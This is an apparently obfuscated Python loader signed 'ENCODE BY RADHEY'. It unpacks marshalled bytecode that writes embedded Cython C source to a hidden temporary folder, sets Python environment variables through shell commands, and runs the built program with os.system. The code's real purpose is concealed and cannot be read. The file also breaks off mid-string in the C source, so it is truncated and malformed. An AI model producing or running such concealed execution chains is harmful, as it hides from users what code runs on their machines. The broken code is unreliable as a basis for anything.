# THIS ENCODE BY RADHEY | @sunradhey 
R,A,D,H,E,Y,J,I,I = map(chr, [82, 65, 68, 72, 69, 89, 74, 73, 73])
RA, DH, EY, JII = R+A, D+H, E+Y, J+I+I
RADHEY = R+A+D+H+E+Y+J+I+I
import tempfile as t
from os import path as rdh_path, remove as rdrmv, system as stem
from base64 import b64decode as lmao
radheyenc = (b'import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\xf3\xba\x03\x00\x00\x95\x00\\\x00"\x00\\\x01/\x00S\x00Q\x015\x02\x00\x00\x00\x00\x00\x00u\t\x00\x00r\x02r\x03r\x04r\x05r\x06r\x07r\x08r\tr\t\\\x02\\\x03-\x00\x00\x00\\\x04\\\x05-\x00\x00\x00\\\x06\\\x07-\x00\x00\x00\\\x08\\\t-\x00\x00\x00\\\t-\x00\x00\x004\x04u\x04\x00\x00r\nr\x0br\x0cr\r\\\x02\\\x03-\x00\x00\x00\\\x04-\x00\x00\x00\\\x05-\x00\x00\x00\\\x06-\x00\x00\x00\\\x07-\x00\x00\x00\\\x08-\x00\x00\x00\\\t-\x00\x00\x00\\\t-\x00\x00\x00r\x0eS\x01S\x02K\x0fr\x10S\x01S\x03K\x11J\x12r\x13J\x14r\x15J\x16r\x17 \x00S\x01S\x04K\x18J\x19r\x1a \x00\\\x1b"\x00S\x055\x01\x00\x00\x00\x00\x00\x00 \x00\\\x1b"\x00S\x065\x01\x00\x00\x00\x00\x00\x00 \x00\\\x1b"\x00S\x075\x01\x00\x00\x00\x00\x00\x00 \x00\\\x1b"\x00S\x065\x01\x00\x00\x00\x00\x00\x00 \x00\\\x1c"\x00S\x085\x01\x00\x00\x00\x00\x00\x00R:\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00r\x1eS\tr\x1fS\n\\\x1c"\x00S\x085\x01\x00\x00\x00\x00\x00\x00R:\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00-\x00\x00\x00r S\x0b\\\x1c"\x00S\x085\x01\x00\x00\x00\x00\x00\x00RB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00-\x00\x00\x00r"S\x0c\\\x1f-\x00\x00\x00r#\\\x13RH\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00\\\x1f5\x01\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00a\x1c\x00\x00\\\x17"\x00\\ S\r-\x00\x00\x00\\"-\x00\x00\x00S\r-\x00\x00\x00\\#-\x00\x00\x005\x01\x00\x00\x00\x00\x00\x00 \x00\\%"\x00S\x015\x01\x00\x00\x00\x00\x00\x00 \x00S\x0er&S\x0fr\'S\x10RQ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x1c"\x00S\x085\x01\x00\x00\x00\x00\x00\x00RR\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00RU\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x115\x01\x00\x00\x00\x00\x00\x00S\x01\x05\x00\x00\x00RU\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x105\x01\x00\x00\x00\x00\x00\x00S\x02S\x12\x04\x005\x01\x00\x00\x00\x00\x00\x00r+S\x13\\\x1e-\x00\x00\x00S\x14-\x00\x00\x00\\+-\x00\x00\x00S\x15-\x00\x00\x00\\\x1f-\x00\x00\x00S\x11-\x00\x00\x00\\\'-\x00\x00\x00S\x16-\x00\x00\x00\\\x1e-\x00\x00\x00S\x17-\x00\x00\x00\\+-\x00\x00\x00r,\\-"\x00\\\'S\x185\x02\x00\x00\x00\x00\x00\x00\x02\x00r.\\.R_\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\&5\x01\x00\x00\x00\x00\x00\x00 \x00S\x02S\x02S\x025\x02\x00\x00\x00\x00\x00\x00 \x00\\\x1c"\x00S\x195\x01\x00\x00\x00\x00\x00\x00Ra\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x13Rb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\x00\\\x1f5\x01\x00\x00\x00\x00\x00\x00S\x1aS\x1b9\x02 \x00\\\x17"\x00\\ S\r-\x00\x00\x00\\"-\x00\x00\x00S\r-\x00\x00\x00\\,-\x00\x00\x00S\r-\x00\x00\x00\\#-\x00\x00\x005\x01\x00\x00\x00\x00\x00\x00 \x00\\\x15"\x00\\\'5\x01\x00\x00\x00\x00\x00\x00 \x00g\x02!\x00,\x00(\x00\x00\x00\x00\x00\x00\x00d\x01\x00\x00f\x02 \x00\x1f\x00 \x00 \x00NW=\x03\x1f\x00f\x01)\x1c)\t\xe9R\x00\x00\x00\xe9A\x00\x00\x00\xe9D\x00\x00\x00\xe9H\x00\x00\x00\xe9E\x00\x00\x00\xe9Y\x00\x00\x00\xe9J\x00\x00\x00\xe9I\x00\x00\x00r\t\x00\x00\x00\xe9\x00\x00\x00\x00N)\x03\xda\x04path\xda\x06remove\xda\x06system)\x01\xda\tb64decodeu!\x00\x00\x00\x1b[1;92m\x1b[38;5;46mLOADING\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xda\x00u?\x00\x00\x00\x1b[1;92m\x1b[38;5;50m####THIS IS ENCODED BY #RADHEY \xe2\x80\xa2 @BoloRadhey\xda\x03sysz\x0e.boloradhey/sxz\x12export PYTHONHOME=z\x19export PYTHON_EXECUTABLE=z\x02./z\x02&&ap,\x0f\x00\n\n#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif \n\n#if defined(Py_LIMITED_API) && !defined(CYTHON_LIMITED_API)\n  #define CYTHON_LIMITED_API 1\n#endif\n\n#include "Python.h"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x03080000\n    #error Cython requires Python 3.8+.\n#else\n#define __PYX_ABI_VERSION "3_1_2"\n#define CYTHON_HEX_VERSION 0x030102F0\n#define CYTHON_FUTURE_DIVISION 1\n\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(_WIN32) && !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #define HAVE_LONG_LONG\n#endif\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#define __PYX_LIMITED_VERSION_HEX PY_VERSION_HEX\n#if defined(GRAALVM_PYTHON)\n  \n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 1\n  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_TYPE_SPECS\n  #define CYTHON_USE_TYPE_SPECS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n  #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_ASSUME_SAFE_SIZE\n  #define CYTHON_ASSUME_SAFE_SIZE 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #undef CYTHON_USE_MODULE_STATE\n  #define CYTHON_USE_MODULE_STATE 0\n  #undef CYTHON_USE_SYS_MONITORING\n  #define CYTHON_USE_SYS_MONITORING 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_AM_SEND\n  #define CYTHON_USE_AM_SEND 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 1\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n  #undef CYTHON_USE_FREELISTS\n  #define CYTHON_USE_FREELISTS 0\n#elif defined(PYPY_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 1\n  #ifndef CYTHON_USE_TYPE_SPECS\n    #define CYTHON_USE_TYPE_SPECS 0\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n  #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #ifndef CYTHON_ASSUME_SAFE_SIZE\n    #define CYTHON_ASSUME_SAFE_SIZE 1\n  #endif\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #if PY_VERSION_HEX < 0x03090000\n    #undef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #undef CYTHON_USE_MODULE_STATE\n  #define CYTHON_USE_MODULE_STATE 0\n  #undef CYTHON_USE_SYS_MONITORING\n  #define CYTHON_USE_SYS_MONITORING 0\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE (PYPY_VERSION_NUM >= 0x07030C00)\n  #endif\n  #undef CYTHON_USE_AM_SEND\n  #define CYTHON_USE_AM_SEND 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC (PYPY_VERSION_NUM >= 0x07031100)\n  #endif\n  #undef CYTHON_USE_FREELISTS\n  #define CYTHON_USE_FREELISTS 0\n#elif defined(CYTHON_LIMITED_API)\n  #ifdef Py_LIMITED_API\n    #undef __PYX_LIMITED_VERSION_HEX\n    #define __PYX_LIMITED_VERSION_HEX Py_LIMITED_API\n  #endif\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 1\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #undef CYTHON_CLINE_IN_TRACEBACK\n  #define CYTHON_CLINE_IN_TRACEBACK 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_TYPE_SPECS\n  #define CYTHON_USE_TYPE_SPECS 1\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #endif\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 0\n  #endif\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_ASSUME_SAFE_SIZE\n  #define CYTHON_ASSUME_SAFE_SIZE 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL (__PYX_LIMITED_VERSION_HEX >= 0x030C0000)\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_MODULE_STATE\n    #define CYTHON_USE_MODULE_STATE 0\n  #endif\n  #undef CYTHON_USE_SYS_MONITORING\n  #define CYTHON_USE_SYS_MONITORING 0\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 0\n  #endif\n  #ifndef CYTHON_USE_AM_SEND\n    #define CYTHON_USE_AM_SEND (__PYX_LIMITED_VERSION_HEX >= 0x030A0000)\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n  #undef CYTHON_USE_FREELISTS\n  #define CYTHON_USE_FREELISTS 0\n#else\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 1\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #ifdef Py_GIL_DISABLED\n    #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 1\n  #else\n    #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #endif\n  #if PY_VERSION_HEX < 0x030A0000\n    #undef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #elif !defined(CYTHON_USE_TYPE_SLOTS)\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #ifndef CYTHON_USE_TYPE_SPECS\n    #define CYTHON_USE_TYPE_SPECS 0\n  #endif\n  #ifndef CYTHON_USE_PYTYPE_LOOKUP\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\n  #endif\n  #ifndef CYTHON_USE_PYLONG_INTERNALS\n    #define CYTHON_USE_PYLONG_INTERNALS 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_USE_PYLIST_INTERNALS\n    #define CYTHON_USE_PYLIST_INTERNALS 0\n  #elif !defined(CYTHON_USE_PYLIST_INTERNALS)\n    #define CYTHON_USE_PYLIST_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING || PY_VERSION_HEX >= 0x030B00A2\n    #undef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\n    #define CYTHON_USE_UNICODE_WRITER 1\n  #endif\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1\n  #elif !defined(CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS)\n    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_SIZE\n    #define CYTHON_ASSUME_SAFE_SIZE 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #ifndef CYTHON_FAST_THREAD_STATE\n    #define CYTHON_FAST_THREAD_STATE 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_FAST_GIL\n    #define CYTHON_FAST_GIL 0\n  #elif !defined(CYTHON_FAST_GIL)\n    #define CYTHON_FAST_GIL (PY_VERSION_HEX < 0x030C00A6)\n  #endif\n  #ifndef CYTHON_METH_FASTCALL\n    #define CYTHON_METH_FASTCALL 1\n  #endif\n  #ifndef CYTHON_FAST_PYCALL\n    #define CYTHON_FAST_PYCALL 1\n  #endif\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_MODULE_STATE\n    #define CYTHON_USE_MODULE_STATE 0\n  #endif\n  #ifndef CYTHON_USE_SYS_MONITORING\n    #define CYTHON_USE_SYS_MONITORING (PY_VERSION_HEX >= 0x030d00B1)\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #ifndef CYTHON_USE_AM_SEND\n    #define CYTHON_USE_AM_SEND 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_USE_DICT_VERSIONS\n    #define CYTHON_USE_DICT_VERSIONS 0\n  #elif !defined(CYTHON_USE_DICT_VERSIONS)\n    #define CYTHON_USE_DICT_VERSIONS  (PY_VERSION_HEX < 0x030C00A5 && !CYTHON_USE_MODULE_STATE)\n  #endif\n  #ifndef CYTHON_USE_EXC_INFO_STACK\n    #define CYTHON_USE_EXC_INFO_STACK 1\n  #endif\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\n  #endif\n  #ifndef CYTHON_USE_FREELISTS\n    #define CYTHON_USE_FREELISTS (!CYTHON_COMPILING_IN_CPYTHON_FREETHREADING)\n  #endif\n#endif\n#ifndef CYTHON_FAST_PYCCALL\n#define CYTHON_FAST_PYCCALL  CYTHON_FAST_PYCALL\n#endif\n#ifndef CYTHON_VECTORCALL\n#if CYTHON_COMPILING_IN_LIMITED_API\n#define CYTHON_VECTORCALL  (__PYX_LIMITED_VERSION_HEX >= 0x030C0000)\n#else\n#define CYTHON_VECTORCALL  (CYTHON_FAST_PYCCALL && PY_VERSION_HEX >= 0x030800B1)\n#endif\n#endif\n#define CYTHON_BACKPORT_VECTORCALL (CYTHON_METH_FASTCALL && PY_VERSION_HEX < 0x030800B1)\n#if CYTHON_USE_PYLONG_INTERNALS\n  #undef SHIFT\n  #undef BASE\n  #undef MASK\n  #ifdef SIZEOF_VOID_P\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\n  #endif\n#endif\n#ifndef __has_attribute\n  #define __has_attribute(x) 0\n#endif\n#ifndef __has_cpp_attribute\n  #define __has_cpp_attribute(x) 0\n#endif\n#ifndef CYTHON_RESTRICT\n  #if defined(__GNUC__)\n    #define CYTHON_RESTRICT __restrict__\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\n    #define CYTHON_RESTRICT __restrict\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_RESTRICT restrict\n  #else\n    #define CYTHON_RESTRICT\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n  #if defined(__cplusplus)\n    \n    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)\n      #if __has_cpp_attribute(maybe_unused)\n        #define CYTHON_UNUSED [[maybe_unused]]\n      #endif\n    #endif\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n# if defined(__GNUC__)\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\n#   else\n#     define CYTHON_UNUSED\n#   endif\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\n# else\n#   define CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_UNUSED_VAR\n#  if defined(__cplusplus)\n     template<class T> void CYTHON_UNUSED_VAR( const T& ) { }\n#  else\n#    define CYTHON_UNUSED_VAR(x) (void)(x)\n#  endif\n#endif\n#ifndef CYTHON_MAYBE_UNUSED_VAR\n  #define CYTHON_MAYBE_UNUSED_VAR(x) CYTHON_UNUSED_VAR(x)\n#endif\n#ifndef CYTHON_NCP_UNUSED\n# if CYTHON_COMPILING_IN_CPYTHON && !CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n#  define CYTHON_NCP_UNUSED\n# else\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_USE_CPP_STD_MOVE\n  #if defined(__cplusplus) && (\\\n    __cplusplus >= 201103L || (defined(_MSC_VER) && _MSC_VER >= 1600))\n    #define CYTHON_USE_CPP_STD_MOVE 1\n  #else\n    #define CYTHON_USE_CPP_STD_MOVE 0\n  #endif\n#endif\n#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\n#ifdef _MSC_VER\n    #ifndef _MSC_STDINT_H_\n        #if _MSC_VER < 1300\n            typedef unsigned char     uint8_t;\n            typedef unsigned short    uint16_t;\n            typedef unsigned int      uint32_t;\n        #else\n            typedef unsigned __int8   uint8_t;\n            typedef unsigned __int16  uint16_t;\n            typedef unsigned __int32  uint32_t;\n        #endif\n    #endif\n    #if _MSC_VER < 1300\n        #ifdef _WIN64\n            typedef unsigned long long  __pyx_uintptr_t;\n        #else\n            typedef unsigned int        __pyx_uintptr_t;\n        #endif\n    #else\n        #ifdef _WIN64\n            typedef unsigned __int64    __pyx_uintptr_t;\n        #else\n            typedef unsigned __int32    __pyx_uintptr_t;\n        #endif\n    #endif\n#else\n    #include <stdint.h>\n    typedef uintptr_t  __pyx_uintptr_t;\n#endif\n#ifndef CYTHON_FALLTHROUGH\n  #if defined(__cplusplus)\n    \n    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)\n      #if __has_cpp_attribute(fallthrough)\n        #define CYTHON_FALLTHROUGH [[fallthrough]]\n      #endif\n    #endif\n    #ifndef CYTHON_FALLTHROUGH\n      #if __has_cpp_attribute(clang::fallthrough)\n        #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\n      #elif __has_cpp_attribute(gnu::fallthrough)\n        #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\n      #endif\n    #endif\n  #endif\n  #ifndef CYTHON_FALLTHROUGH\n    #if __has_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\n    #else\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n  #if defined(__clang__) && defined(__apple_build_version__)\n    #if __apple_build_version__ < 7000000\n      #undef  CYTHON_FALLTHROUGH\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n#endif\n#ifndef Py_UNREACHABLE\n  #define Py_UNREACHABLE()  assert(0); abort()\n#endif\n#ifdef __cplusplus\n  template <typename T>\n  struct __PYX_IS_UNSIGNED_IMPL {static const bool value = T(0) < T(-1);};\n  #define __PYX_IS_UNSIGNED(type) (__PYX_IS_UNSIGNED_IMPL<type>::value)\n#else\n  #define __PYX_IS_UNSIGNED(type) (((type)-1) > 0)\n#endif\n#if CYTHON_COMPILING_IN_PYPY == 1\n  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x030A0000)\n#else\n  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000)\n#endif\n#define __PYX_REINTERPRET_FUNCION(func_pointer, other_pointer) ((func_pointer)(void(*)(void))(other_pointer))\n\n\n#ifndef CYTHON_INLINE\n  #if defined(__clang__)\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\n  #elif defined(__GNUC__)\n    #define CYTHON_INLINE __inline__\n  #elif defined(_MSC_VER)\n    #define CYTHON_INLINE __inline\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_INLINE inline\n  #else\n    #define CYTHON_INLINE\n  #endif\n#endif\n\n\n#define __PYX_BUILD_PY_SSIZE_T "n"\n#define CYTHON_FORMAT_SSIZE_T "z"\n#define __Pyx_BUILTIN_MODULE_NAME "builtins"\n#define __Pyx_DefaultClassType PyType_Type\n#if CYTHON_COMPILING_IN_LIMITED_API\n    #ifndef CO_OPTIMIZED\n    static int CO_OPTIMIZED;\n    #endif\n    #ifndef CO_NEWLOCALS\n    static int CO_NEWLOCALS;\n    #endif\n    #ifndef CO_VARARGS\n    static int CO_VARARGS;\n    #endif\n    #ifndef CO_VARKEYWORDS\n    static int CO_VARKEYWORDS;\n    #endif\n    #ifndef CO_ASYNC_GENERATOR\n    static int CO_ASYNC_GENERATOR;\n    #endif\n    #ifndef CO_GENERATOR\n    static int CO_GENERATOR;\n    #endif\n    #ifndef CO_COROUTINE\n    static int CO_COROUTINE;\n    #endif\n#else\n    #ifndef CO_COROUTINE\n      #define CO_COROUTINE 0x80\n    #endif\n    #ifndef CO_ASYNC_GENERATOR\n      #define CO_ASYNC_GENERATOR 0x200\n    #endif\n#endif\nstatic int 